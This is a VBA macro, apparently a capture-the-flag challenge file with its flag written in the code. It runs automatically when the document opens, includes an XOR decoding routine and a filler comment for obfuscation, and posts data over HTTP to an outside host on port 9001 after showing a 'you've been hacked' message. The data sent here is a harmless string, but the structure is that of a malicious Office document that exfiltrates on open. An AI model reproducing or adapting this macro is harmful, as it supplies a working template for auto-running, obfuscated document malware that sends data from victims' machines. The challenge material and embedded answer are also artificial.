Private Sub Document_Open()
	If ActiveDocument.Variables("zVaxnp").Value <> "macro" Then
		funkcja
		ActiveDocument.Variables("zVaxnp").Value = "macro"
		If ActiveDocument.ReadOnly = False Then
			ActiveDocument.Save
		End If
	End If
End Sub

Private Function rox(arg1 As Variant, arg2 As Integer)
	Dim result, varval As String, i, UXUrCHGOOq
	varval = ActiveDocument.Variables("zVaxnp").Value()
	' Qx7BM0v9GDD2YYgfAxtWm2CShiUx2ikHTazpgtf90bEGuUwk46nFlDwmJFfGuLcFxp30f7iQpYIogbVhjqV9Us03sJNQqFTrViarTSJzNBnXY5rFYy6QVxwqfqQrAKUHa3PBu81C4zT4YRE3jX8lFiNQ7JHQBVuXAEQXIajamj1EDqa9n34eHZ7y0XbfuxPt7pMjWo7Jm0btMvzatyCPbZjczioyr3RbIbZDklpZDvbZdKnjKZroMg6EzZA1y2
	result = ""
	i = 1
	While i < UBound(arg1) + 2
        UXUrCHGOOq = i Mod Len(varval): If UXUrCHGOOq = 0 Then UXUrCHGOOq = Len(varval)
        result = result + Chr(Asc(Mid(varval, UXUrCHGOOq + arg2, 1)) Xor CInt(arg1(i - 1)))
        i = i + 1
    Wend
    rox = result
End Function

Public Function funkcja()
    arr1 = "Haha you've been hacked! I'm stealing all your files!"
    MsgBox arr1
    random1 = "http://dvc.tf:9001"
    random2 = "Don't worry, I didn't really steal your files :3 the flag is dvCTF{vb4_0bfu5c4710n_5h3n4n164n5}"
    Set random3 = CreateObject("WinHttp.WinHttpRequest.5.1")
    random3.Open "post", random1, False
    random3.Send random2
End Function
